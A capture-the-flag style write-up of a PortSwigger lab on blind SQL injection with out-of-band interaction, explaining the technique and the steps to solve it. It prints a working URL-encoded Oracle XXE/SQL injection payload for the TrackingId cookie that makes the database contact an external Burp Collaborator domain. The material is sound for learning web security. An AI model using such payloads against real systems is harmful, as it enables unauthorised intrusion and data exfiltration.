# 🎯 Platform: PortSwigger
### 📝 Target: Lab - Blind SQL injection with out-of-band interaction

> **Vulnerability Location:** `TrackingId` cookie
> **Goal:** Exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

---

## 🔍 Analysis & Attack Flow
### The Mechanism (Out-of-Band / OAST)
*   **Context:** The SQL query is executed asynchronously and has absolutely no effect on the application's response. This means traditional blind techniques (Boolean or Time-based) will not work.
*   **The Technique:** Instead of trying to force data back through the HTTP response, we force the backend database server to make an external network connection (like a DNS lookup) to a server we control (Burp Collaborator).
*   **Database Specifics:** By referencing the SQL injection cheat sheet, we can find specific payloads that trigger DNS lookups. For this attack, an Oracle payload leveraging an XML External Entity (XXE) vulnerability via `EXTRACTVALUE` and `xmltype` was utilized.

---

## 🚀 Exploitation Steps

### Step 1: Generate a Collaborator Payload
*   Open the Burp Collaborator client and copy a unique payload domain to the clipboard (e.g., `2aduovkm01bdux8kfhvtwkd3uu0locc1.oastify.com`).

### Step 2: Construct the Injection Payload
*   **Reference:** Consult the PortSwigger SQL injection cheat sheet for the Oracle DNS lookup payload.
*   **Payload Construction:** Replace the placeholder domain in the cheat sheet with your unique Burp Collaborator subdomain.
*   **Final Injected Payload (URL Encoded):**
    ```sql
    '||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//2aduovkm01bdux8kfhvtwkd3uu0locc1.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual)--
    ```


### Step 3: Execute the Attack
*   Use Burp Repeater to send an HTTP GET request, appending the constructed payload to the `TrackingId` cookie value.
*   The server will return a normal `HTTP/2 200 OK` response, showing no visible signs of execution on the front end.

### Step 4: Verify the Out-of-Band Interaction
*   Return to the Burp Collaborator client and poll for interactions.
*   Observe the results: Multiple `DNS` lookups should appear in the log, confirming that the backend database successfully executed the injected command and resolved the external domain.
*   🎉 **Lab is marked as solved!**
